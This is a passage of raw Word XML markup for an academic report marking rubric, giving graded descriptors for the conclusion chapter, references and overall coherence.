              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3DDB1081" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Pulls together all threads from previous chapters to </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>come to a conclusion</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>. Extends discussion to provide detailed plan for further investigations.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1814FA36" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Pulls together most threads from previous chapters to </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>come to a conclusion</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>. Extends discussion to provide plan with some detail for further investigations.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2529" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="77CF98D2" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Pulls together some threads from previous chapters to </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>come to a conclusion</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>. Extends discussion to some extent to provide reasonable plan for further investigations.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2240" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72269AC2" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Doesn’t resolve threads from previous chapters, and no viable conclusion. Poor discussion leading to weak plan for further investigations.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1893" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E0C0906" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Doesn’t resolve threads from previous chapters, and no conclusion. No discussion leading to poor plan for further investigations.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1985" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3EC31175" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:ind w:right="35"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Discussion doesn’t relate to previous </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>chapters, and</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve"> provides no conclusion. No discussion and no plan for further investigations.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w14:paraId="7037931F" w14:textId="77777777" w:rsidTr="004B7E63">
        <w:trPr>
          <w:trHeight w:val="795"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1519"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10BD8A6" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>References</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="801" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E833E5B" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2065" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3BFC122F" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Properly formatted and proper discrimination of sources for Reference and those for Bibliography.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="505268EB" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Properly formatted and good discrimination of sources for Reference and those for Bibliography.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2529" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="048FE308" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Mostly well formatted and reasonable discrimination of sources for Reference and those for Bibliography.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2240" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F054D5A" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Adequate formatting and acceptable discrimination of sources for Reference and those for Bibliography.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1893" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="297525F3" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Poor formatting and barely acceptable discrimination of sources for Reference and those for Bibliography.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1985" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0E3DB438" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:ind w:right="35"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Unsatisfactory formatting and unacceptable discrimination of sources for Reference and those for Bibliography.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w14:paraId="259ED8C1" w14:textId="77777777" w:rsidTr="004B7E63">
        <w:trPr>
          <w:trHeight w:val="795"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1519" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F13F0BE" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>Overall</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="801" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5B0772D4" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2065" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="47CD05A2" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Formatting and coherence of report shows excellent appreciation of structure and </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
              <w:t>purpose .</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2126" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F5DF0CB" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E7F26" w:rsidRDefault="00ED2F72" w:rsidP="004B7E63">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:eastAsia="Times New Roman" w:hAnsi="Verdana" w:cs="Calibri"/>
                <w:color w:val="000000"/>
                <w:sz w:val="15"/>
                <w:szCs w:val="15"/>
                <w:lang w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000E7F26">
              <w:rPr>
